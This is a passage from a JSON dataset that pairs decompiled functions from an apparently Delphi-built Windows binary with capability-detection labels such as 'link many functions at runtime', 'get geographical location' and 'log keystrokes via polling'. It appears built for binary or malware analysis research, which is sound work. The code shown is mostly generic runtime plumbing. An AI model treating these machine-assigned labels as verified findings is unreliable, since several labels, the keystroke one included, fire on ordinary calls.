        "decompiled_code": "\nuint __cdecl fcn.0045a330(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(arg_8h + -4) + 0x2f0);\n    if ((iVar2 != 0) && (iVar2 = *(iVar2 + 8),  -1 < iVar2 + -1)) {\n        do {\n            fcn.0041c4c8();\n            cVar1 = fcn.00449ad4();\n            if (cVar1 != '\\0') {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 161
    },
    "0045a8d0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045a8d0(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x45a996;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    (**(*in_EAX + -0x10))();\n    if (**(param_2 + 8) == 0xc) {\n        fcn.0043d7bc();\n        fcn.004046b8();\n        uVar1 = fcn.00404888();\n        fcn.00404a88(uVar1);\n        fcn.0043d7cc();\n        iVar2 = fcn.00404888();\n        if (0 < iVar2) {\n            iVar3 = 1;\n            do {\n                if ((*(iVar3 + -1) == '\\n') || (*(iVar3 + -1) == '\\r')) {\n                    fcn.00404c14();\n                    break;\n                }\n                iVar3 = iVar3 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.0043d878();\n    }\n    else if (**(param_2 + 8) == 0xb00b) {\n        fcn.00456774();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x45a99d;\n    uStack24 = 0x45a995;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 410
    },
    "0045d984": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0045d984(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    \n    iVar2 = fcn.0045ad88();\n    if (-1 < iVar2 + -1) {\n        do {\n            piVar3 = fcn.0045ad74();\n            cVar1 = fcn.00444380();\n            if (cVar1 != '\\0') {\n                uVar4 = fcn.0044407c();\n                iVar5 = sub.user32.dll_IsWindowVisible(uVar4);\n                if (iVar5 != 0) {\n                    uVar4 = fcn.0044407c();\n                    iVar5 = sub.user32.dll_IsWindowEnabled(uVar4);\n                    if (iVar5 != 0) {\n                        (**(*piVar3 + 0xdc))();\n                    }\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 231
    },
    "0045db80": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0045db80(void)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    \n    iVar1 = fcn.0045ad6c();\n    if (-1 < iVar1 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.0045ad58();\n            fcn.0043e9fc(arg_8h);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0045ea50": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.0045ea50(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t unaff_EBX;\n    int32_t unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    uchar *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uchar auStack24 [3];\n    int32_t var_11h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    *0x4 = 6;\n    do {\n        *0x4 = *0x4 + -1;\n    } while (*0x4 != 0);\n    uStack12 = 0;\n    var_20h = 0x45ec5a;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0045ea50::var_24h;\n    var_28h = 0x45ea88;\n    var_18h = unaff_ESI;\n    _auStack24 = unaff_EBX;\n    fcn.0040461c();\n    var_28h = 0x45ea95;\n    uVar1 = fcn.0045e9b4();\n    _auStack24 = _auStack24 & 0xffffff | uVar1 << 0x18;\n    if ((uVar1 << 0x18 & 0x1000000) == 0) {\n        stack0xffffffec = 1;\n        var_28h = 0x45eab1;\n        iVar3 = fcn.00404888();\n        if (0 < iVar3) {\n            do {\n                var_18h = iVar3;\n                var_28h = 0x45eacb;\n                cVar2 = fcn.0045e860();\n                if (cVar2 - 1U < 2) {\n                    var_28h = &fcn.0045ea50::var_1ch;\n                    var_2ch = 0x45eae7;\n                    fcn.00404ae8();\n                    var_2ch = var_1ch;\n                    var_30h = 0x45eaf6;\n                    fcn.0045ea30();\n                    var_30h = 0x45eb00;\n                    fcn.004047b0();\n                    var_30h = var_20h;\n                    var_34h = &fcn.0045ea50::var_24h;\n                    fcn.00404888();\n                    fcn.00404ae8();\n                    fcn.00404948();\n                    unique0x00007a80 = stack0xffffffec + 1;\n                }\n                else if (cVar2 - 4U < 2) {\n                    var_28h = 0x45eb3f;\n                    iVar3 = fcn.00404888();\n                    if (iVar3 < stack0xffffffec) {\n                        var_28h = 0x45eb4f;\n                        fcn.004047b0();\n                        var_28h = 0x45eb59;\n                        fcn.00404890();\n                    }\n                    unique0x00007a80 = stack0xffffffec + 1;\n                }\n                var_18h = var_18h + -1;\n                iVar3 = var_18h;\n            } while (var_18h != 0);\n        }\n    }\n    else {\n        var_28h = 0x45eb72;\n        *NULL = fcn.00404888();\n        var_28h = 0x45eb7d;\n        iVar3 = fcn.00404888();\n        if (-1 < iVar3 + -1) {\n            var_ch = 0;\n            var_18h = iVar3;\n            do {\n                var_28h = 0x45eb99;\n                fcn.00404888();\n                var_28h = 0x45eba8;\n                cVar2 = fcn.0045e860();\n                if (cVar2 - 1U < 2) {\n                    var_28h = &fcn.0045ea50::var_2ch;\n                    var_2ch = 0x45ebc3;\n                    fcn.00404ae8();\n                    var_30h = 0x45ebd2;\n                    fcn.0045ea30();\n                    var_30h = 0x45ebdc;\n                    fcn.004047b0();\n                    var_34h = &fcn.0045ea50::var_34h;\n                    fcn.00404888();\n                    fcn.00404ae8();\n                    var_24h = var_34h;\n                    fcn.00404948();\n                }\n                else if (cVar2 - 4U < 2) {\n                    if (stack0xffffffec < 1) {\n                        var_28h = 0x45ec22;\n                        fcn.004047b0();\n                        var_28h = 0x45ec2e;\n                        fcn.004048d4();\n                    }\n                    else {\n                        unique0x00007a80 = stack0xffffffec + -1;\n                    }\n                }\n                var_ch = var_ch + 1;\n                var_18h = var_18h + -1;\n            } while (var_18h != 0);\n        }\n    }\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x45ec61;\n    var_20h = 0x45ec59;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 1329
    },
    "00461960": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00461960(uint param_1, char **param_2)\n\n{\n    int32_t iVar1;\n    \n    fcn.0040461c();\n    while( true ) {\n        iVar1 = fcn.00404888();\n        if ((iVar1 < 2) || (**param_2 != '0')) break;\n        fcn.00404888();\n        fcn.00404ae8();\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "004625c0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.004625c0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = fcn.00404888();\n    if (0 < iVar2) {\n        iVar3 = 1;\n        do {\n            cVar1 = *(in_EAX + -1 + iVar3);\n            if ((cVar1 != '.') && (cVar1 != '0')) {\n                return 0;\n            }\n            iVar3 = iVar3 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 1;\n}\n",
        "token_count": 150
    },
    "00462664": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00462664(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x462705;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.0040461c();\n    fcn.0040461c();\n    while( true ) {\n        iVar1 = fcn.0046199c();\n        if (iVar1 < 0) break;\n        fcn.00408d64();\n        fcn.00408c28();\n        fcn.0040461c();\n        fcn.00461e18();\n        fcn.00461960();\n        fcn.0040461c();\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x46270c;\n    uStack40 = 0x462704;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 269
    },
    "00462724": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00462724(uint param_1, int16_t param_2)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    iVar2 = 4;\n    do {\n        var_8h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_20h = 0x4628a9;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00462724::var_24h;\n    uVar1 = **0x4847fc;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    fcn.0040461c();\n    while (*_pe_dos_header == '0') {\n        var_24h = 0;\n        fcn.00404888();\n        fcn.00404ae8();\n    }\n    if (param_2 == 0) {\n        fcn.004048d4();\n    }\n    else if (param_2 < 1) {\n        iVar2 = fcn.00404888();\n        iVar3 = -param_2;\n        if (iVar2 == iVar3 || SBORROW4(iVar2, iVar3) != iVar2 + param_2 < 0) {\n            fcn.00404888();\n            fcn.00404c78();\n            fcn.00404890();\n        }\n        else {\n            iVar2 = fcn.00404888();\n            iVar3 = -param_2;\n            if (iVar2 != iVar3 && SBORROW4(iVar2, iVar3) == iVar2 + param_2 < 0) {\n                fcn.00404ae8(&fcn.00462724::var_1ch);\n                fcn.004047b0(var_1ch);\n                fcn.00404888(&fcn.00462724::var_24h, var_20h);\n                fcn.00404ae8();\n                fcn.00404948(var_24h);\n            }\n        }\n    }\n    else {\n        fcn.0040308c();\n        var_10h = CONCAT31(CONCAT21(var_10h._2_2_, uVar1), 1);\n        fcn.0040305c();\n        fcn.0040482c();\n        fcn.00404c78(var_8h);\n        fcn.00404948(_pe_dos_header, var_14h);\n    }\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x4628b0;\n    var_20h = 0x4628a0;\n    fcn.004045ec();\n    var_20h = 0x4628a8;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 779
    },
    "0046c0c8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0046c0c8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.0041d234();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            fcn.0041d23c();\n            iVar2 = fcn.00408ab8();\n            if (iVar2 == 0) {\n                return iVar3;\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return -1;\n}\n",
        "token_count": 149
    },
    "0046c9d0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0046c9d0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.0041c4c8();\n            fcn.004053b4();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    (**(**(in_EAX + 4) + 8))();\n    return;\n}\n",
        "token_count": 124
    },
    "0046ca08": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046ca08(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar uVar3;\n    \n    fcn.004177f4(param_1);\n    cVar1 = fcn.00415b20();\n    if ((cVar1 == '\\0') && (iVar2 = *(*(in_EAX + 4) + 8),  -1 < iVar2 + -1)) {\n        uVar3 = true;\n        do {\n            fcn.0041c4c8();\n            fcn.004177fc();\n            if (uVar3) {\n                fcn.0041c4c8();\n                fcn.004107fc();\n                return;\n            }\n            iVar2 = iVar2 + -1;\n            uVar3 = iVar2 == 0;\n        } while (!uVar3);\n    }\n    return;\n}\n",
        "token_count": 205
    },
    "0046d2fc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0046d2fc(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            uVar1 = fcn.0041c4c8();\n            iVar2 = fcn.00408ab8();\n            if (iVar2 == 0) goto code_r0x0046d335;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    uVar1 = 0;\ncode_r0x0046d335:\n    return CONCAT44(param_2, uVar1);\n}\n",
        "token_count": 182
    },
    "0046d3bc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0046d3bc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            piVar1 = fcn.0041c4c8();\n            iVar2 = (**(*piVar1 + 0x7c))();\n            if (iVar2 == param_2) goto code_r0x0046d3f2;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    piVar1 = NULL;\ncode_r0x0046d3f2:\n    return CONCAT44(param_2, piVar1);\n}\n",
        "token_count": 196
    },
    "004741a0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong __fastcall fcn.004741a0(uint param_1, int32_t *param_2)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint uStack20;\n    \n    uStack20._1_3_ = param_1 >> 8;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    uVar1 = in_EAX;\n    if (param_2 != NULL) {\n        do {\n            if (param_2[0x21] != 0) {\n                uVar1 = (**(**(param_2[0x21] + 0x34) + 0x128))();\n                if (in_EAX == uVar1) goto code_r0x004741e9;\n            }\n            uVar1 = (**(*param_2 + 0x128))();\n            if (uVar1 == 0) break;\n            if (in_EAX == uVar1) goto code_r0x004741e9;\n            param_2 = *(uVar1 + 0x30);\n        } while (param_2 != NULL);\n    }\n    uStack20 = uStack20._1_3_ << 8;\ncode_r0x004741e9:\n    return CONCAT44(uStack20, uVar1 & 0xffffff00 | uStack20 & 0xff);\n}\n",
        "token_count": 312
    },
    "004760ac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004760ac(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(arg_8h + -4) + 0x8c);\n    if ((iVar2 != 0) && (iVar2 = *(iVar2 + 8),  -1 < iVar2 + -1)) {\n        do {\n            fcn.0041c4c8();\n            cVar1 = fcn.00474d20();\n            if (cVar1 != '\\0') {\n                fcn.00477530();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "00477084": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00477084(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = *(*(arg_8h + -4) + 0x8c);\n    if ((iVar3 != 0) && (iVar3 = *(iVar3 + 8),  -1 < iVar3 + -1)) {\n        do {\n            piVar2 = fcn.0041c4c8();\n            cVar1 = fcn.00474d20();\n            if (cVar1 != '\\0') {\n                (**(*piVar2 + 0x20c))();\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "0047bf6c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0047bf6c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x208);\n    iVar2 = *(iVar1 + 0x4c);\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                fcn.0041c4c8();\n                fcn.00403820();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00403820();\n        *(iVar1 + 0x4c) = 0;\n    }\n    return;\n}\n",
        "token_count": 170
    },
    "0047e5bc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0047e5bc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint unaff_EBX;\n    uchar *unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint in_stack_ffffffd0;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uchar *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_ch = 4;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x47e706;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_20h;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    cVar1 = fcn.0047e714();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.00406298();\n        in_stack_ffffffd0 = *(in_EAX + 0x30);\n        sub.oleaut32.dll_GetActiveObject(in_stack_ffffffd0, 0, uVar2);\n        cVar1 = fcn.0041966c();\n        if (cVar1 == '\\0') {\n            fcn.00465b9c();\n        }\n    }\n    else if (cVar1 == '\\x01') {\n        fcn.00465b9c();\n    }\n    else if (cVar1 == '\\x02') {\n        uVar2 = fcn.00406298();\n        in_stack_ffffffd0 = *(in_EAX + 0x30);\n        uVar2 = sub.oleaut32.dll_GetActiveObject(in_stack_ffffffd0, 0, uVar2);\n        cVar1 = fcn.0041966c();\n        if (cVar1 == '\\0') {\n            arg_8h = &var_4h;\n            fcn.00465b70();\n            var_14h = var_18h;\n            var_10h = CONCAT31(var_10h._1_3_, 0xb);\n            fcn.00465b44();\n            var_ch = var_1ch;\n            var_8h._0_1_ = 0xb;\n            fcn.0040675c(&var_14h);\n            fcn.00409998(arg_8h);\n            fcn.004659a8(0, uVar2);\n            fcn.00403fc0();\n        }\n    }\n    else if (cVar1 == '\\x03') {\n        fcn.00404e20();\n        fcn.00465cb4();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00404cd4(0x47e70d);\n    fcn.004045ec();\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 766
    },
    "0040905c": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nulong fcn.0040905c(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uStack36;\n    \n    iVar1 = sub.kernel32.dll_WriteFile_1();\n    uStack36 = in_EAX;\n    if (iVar1 == 0) {\n        uStack36 = 0xffffffff;\n    }\n    return CONCAT44(uStack36, uStack36);\n}\n",
        "token_count": 88
    },
    "0042f3b8": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nvoid fcn.0042f3b8(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x42f51c);\n    if (iVar1 != 0) {\n        *0x485970 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42f52c);\n        *0x485974 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42f540);\n        *0x485968 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42f554);\n        *0x48596c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42f56c);\n        *0x485944 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42f584);\n        if (*0x485944 == 0) {\n            *0x485944 = 0x407184;\n        }\n        *0x485948 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42f59c);\n        if (*0x485948 == 0) {\n            *0x485948 = 0x407534;\n        }\n        *0x48594c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42f5b4);\n        if (*0x48594c == 0) {\n            *0x48594c = 0x4072cc;\n        }\n        *0x485950 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42f5cc);\n        if (*0x485950 == 0) {\n            *0x485950 = 0x4072bc;\n        }\n        *0x485954 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42f5e4);\n        if (*0x485954 == 0) {\n            *0x485954 = 0x4072c4;\n        }\n        *0x485958 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42f5f8);\n        if (*0x485958 == 0) {\n            *0x485958 = 0x4074e4;\n        }\n        *0x48595c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42f60c);\n        if (*0x48595c == 0) {\n            *0x48595c = 0x4074dc;\n        }\n        *0x485960 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42f624);\n        if (*0x485960 == 0) {\n            *0x485960 = 0x4074ec;\n        }\n    }\n    return;\n}\n",
        "token_count": 614
    },
    "0045e724": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.0045e724(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x45e748);\n    if (iVar1 != 0) {\n        *0x483e0c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x45e754);\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "00465f74": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nvoid fcn.00465f74(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x465fe8);\n    if (iVar1 != 0) {\n        *0x48402c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x465ff4);\n        *0x484030 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x466008);\n        *0x484034 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x466018);\n        *0x484038 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x466030);\n        *0x48403c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x466048);\n        *0x484040 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x466060);\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "0040c12c": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040c12c(uint32_t param_1)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = sub.kernel32.dll_GetLocaleInfoA_1();\n    if (0 < uVar1) {\n        param_1 = uVar1 & 0xffffff00 | in_EAX & 0xff;\n    }\n    return CONCAT44(in_EAX, param_1);\n}\n",
        "token_count": 100
    },
    "004069e0": {
        "rules": [
            "get thread local storage value"
        ],
        "decompiled_code": "\nint32_t fcn.004069e0(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    \n    if (*0x485664 == '\\0') {\n        return *(*(in_FS_OFFSET + 0x2c) + *0x4830a0 * 4);\n    }\n    iVar1 = sub.kernel32.dll_TlsGetValue(*0x4830a0);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    fcn.00406990();\n    iVar1 = sub.kernel32.dll_TlsGetValue(*0x4830a0);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    return *0x485670;\n}\n",
        "token_count": 159
    },
    "00409030": {
        "rules": [
            "read file on Windows"
        ],
        "decompiled_code": "\nulong fcn.00409030(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uStack36;\n    \n    iVar1 = sub.kernel32.dll_ReadFile();\n    uStack36 = in_EAX;\n    if (iVar1 == 0) {\n        uStack36 = 0xffffffff;\n    }\n    return CONCAT44(uStack36, uStack36);\n}\n",
        "token_count": 85
    },
    "0041f2f4": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f2f4(uint lpType)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint lpName;\n    \n    iVar1 = sub.kernel32.dll_FindResourceA();\n    *(in_EAX + 0x10) = iVar1;\n    if (iVar1 == 0) {\n        fcn.0041f284(&stack0xfffffffc);\n    }\n    iVar1 = sub.kernel32.dll_LoadResource();\n    *(in_EAX + 0x14) = iVar1;\n    if (iVar1 == 0) {\n        fcn.0041f284(&stack0xfffffffc);\n    }\n    uVar2 = sub.kernel32.dll_SizeofResource();\n    sub.kernel32.dll_LockResource(*(in_EAX + 0x14), uVar2);\n    fcn.0041f010();\n    return;\n}\n",
        "token_count": 198
    },
    "004381f8": {
        "rules": [
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.004381f8(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0xc) = 0;\n    *(in_EAX + 0xd) = 0;\n    *(in_EAX + 4) = 0;\n    sub.user32.dll_EnumWindows(fcn.00438144);\n    return;\n}\n",
        "token_count": 81
    },
    "004543c4": {
        "rules": [
            "log keystrokes via polling"
        ],
        "decompiled_code": "\nuint32_t fcn.004543c4(void)\n\n{\n    int16_t iVar1;\n    uint32_t in_EAX;\n    uint32_t unaff_EBX;\n    uint32_t uVar2;\n    \n    uVar2 = unaff_EBX & 0xffffff00 | *0x4543fc;\n    iVar1 = sub.user32.dll_GetKeyState(0x10);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 1;\n    }\n    iVar1 = sub.user32.dll_GetKeyState(0x11);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 4;\n    }\n    if ((in_EAX & 0x20000000) != 0) {\n        uVar2 = uVar2 | 2;\n    }\n    return uVar2;\n}\n",
        "token_count": 189
    }
}